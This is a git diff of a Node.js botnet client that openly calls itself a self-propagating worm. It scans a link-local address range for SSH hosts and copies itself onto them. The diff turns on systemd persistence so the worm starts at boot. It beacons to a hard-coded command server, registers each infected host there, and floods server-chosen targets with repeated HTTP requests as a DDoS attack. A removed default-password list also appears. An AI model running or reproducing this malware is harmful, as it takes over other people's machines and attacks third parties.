@@ -2,17 +2,13 @@ var os = require('os');
 var ifaces = os.networkInterfaces();
 var tcPing = require('tcp-ping');
 var nodeSsh = require('node-ssh');
-var http = require('http');
 const ssh = new nodeSsh();
 const axios = require('axios').default;
 
-const passwords = [
-    "raspberry",
-    "password"
-]
 let ipAddress;
 let targetSpecified = false;
-const commandServer = "169.254.213.246:3030";
+let attackInterval;
+const commandServer = "169.254.103.28:3030";
 
 /**
  * Attempts to connect to the remote machine to propagate the worm
@@ -50,16 +46,16 @@ const attemptConnect = async (ipAddress, localIpAddress) => {
                 await ssh.exec('sudo', ['chmod', '755', 'start.sh']);
                 await ssh.exec('sudo', ['mv', 'start.sh', wormDirectory]);
 
-                // // create a system service to run the executable
-                // await ssh.execCommand('echo "[Unit]\nDescription=Echos Hello World\n\n[Service]\nType=simple\nExecStart=/worm/start.sh\n\n[Install]\nWantedBy=multi-user.target" > worm.service');
-                // await ssh.execCommand('sudo mv worm.service /etc/systemd/system');
-                // await ssh.execCommand('sudo systemctl daemon-reload');
+                // create a system service to run the executable
+                await ssh.execCommand('echo "[Unit]\nDescription=Starts Self Propagating Worm\n\n[Service]\nType=simple\nExecStart=/worm/start.sh\n\n[Install]\nWantedBy=multi-user.target" > worm.service');
+                await ssh.execCommand('sudo mv worm.service /etc/systemd/system');
 
-                // // enable the executable to start on restarts
-                // await ssh.execCommand('sudo systemctl enable worm');
+                // enable the executable to start on restarts
+                await ssh.execCommand('sudo systemctl daemon-reload');
+                await ssh.execCommand('sudo systemctl enable worm');
 
-                // // start the executable
-                // await ssh.execCommand('sudo systemctl start worm');
+                // start the executable
+                await ssh.execCommand('sudo systemctl start worm');
             }
             ssh.dispose();
 
@@ -81,17 +77,21 @@ const checkConnectivity = async (host, port) => {
     return await tcPing.probeAsync(ipAddress, 22);
 }
 
+/**
+ * Scans through the 169.254.0.0/16 ip address range. Loops through all the available ip addresses
+ * and tries to find new hosts to infect.
+ * @param {string} localIpAddress The clients local ip address
+ */
 const scan = async (localIpAddress) => {
     const baseIpAddress = "169.254";
     const sshPort = 22;
     const i = 0;
-    for (let i = 0; i <= 255; i++) {
-        for (let j = 0; j <= 255; j++) {
+    for (let i = 3; i <= 255; i++) {
+        for (let j = 80; j <= 255; j++) {
             ipAddress = `${baseIpAddress}.${i}.${j}`;
             console.log(ipAddress);
             if (ipAddress !== localIpAddress && await checkConnectivity(ipAddress, sshPort)) {
                 try {
-
                     const success = await attemptConnect(ipAddress, localIpAddress);
                 } catch (ex) {
                     console.log(ex);
@@ -103,14 +103,15 @@ const scan = async (localIpAddress) => {
 
 /**
  * sends a heartbeat to the command server so it knows this bot is still alive
+ * @param {string} localIp Local ip address for the client
  */
 const heartbeat = async (localIp) => {
     try {
         const heartbeat = await axios.get(`http://${commandServer}/heartbeat/${localIp}`);
-        if (!targetSpecified && heartbeat.data.target) {
+        if (!targetSpecified && heartbeat.data !== "No Target") {
             targetSpecified = true;
-            attack(heartbeat.data.target);
-        } else {
+            attack(heartbeat.data);
+        } else if (heartbeat.data === "No Target") {
             targetSpecified = false;
         }
     } catch (ex) {
@@ -118,36 +119,27 @@ const heartbeat = async (localIp) => {
     }
 };
 
-
 /**
  * Attacks the specified target with a DDOS attack
- * This will probably be extracted into its own file later
+ * Uses setInterval to attack the target on with a given cadence
  * @param {string} targetIpAddress ip address of the target 
  */
 const attack = (targetIpAddress) => {
-    const cluster = require('cluster');
-    const numCPUS = os.cpus().length;
-
-    if (cluster.isMaster) {
-        for (let i = 0; i < numCPUS - 1; i++) {
-            cluster.fork();
-        }
-    }
-    else
-        attackTarget(targetIpAddress);
-
-    cluster.on('exit', () => {
-        if (targetSpecified)
-            cluster.fork();
-        else {
-            cluster.removeAllListeners();
-        }
-
-    });
+    console.log('attacking', targetIpAddress);
+    this.attackInterval = setInterval(attackTarget, 500, targetIpAddress);
 }
 
-const attackTarget = async (targetIpAddress) => {
-    await axios.get(targetIpAddress);
+/**
+ * uses axios to send a get request to the target url
+ * @param {string} targeturl The uri to attack
+ */
+const attackTarget = async (targeturl) => {
+    console.log('attackTarget', targeturl, targetSpecified);
+    attacked = await axios.get(targeturl)
+    if (!targetSpecified) {
+        clearInterval(this.attackInterval);
+    }
+
 }
 
 /**
@@ -158,7 +150,7 @@ const connectToServer = async (localIp, infectedIp) => {
     return new Promise(async (resolve, reject) => {
         try {
             console.log('connecting to server', commandServer);
-            const result = await axios.post(`http://${commandServer}/landing`, { ip: localIp, infectedIp: infectedIp });
+            const result = await axios.post(`http://${commandServer}/landing`, { ip: localIp, infectedByIp: infectedIp });
             resolve(result);
         } catch (ex) {
             console.log(ex);
@@ -167,6 +159,9 @@ const connectToServer = async (localIp, infectedIp) => {
     });
 }
 
+/**
+ * Queries the local ethernet interface to get the clients local ip address
+ */
 const getLocalIp = () => {
     let localIpAddress;
     return new Promise((resolve, reject) => {
@@ -183,8 +178,10 @@ const getLocalIp = () => {
     })
 }
 
-
-const startBotnet = async () => {
+/**
+ * asynchronous function to start the botnet client
+ */
+const startClient = async () => {
     if (process.argv.length === 4) {
         ipAddress = process.argv[2];
         localIpAddress = process.argv[3]
@@ -203,4 +200,4 @@ const startBotnet = async () => {
     }
 }
 
-startBotnet();
+startClient();
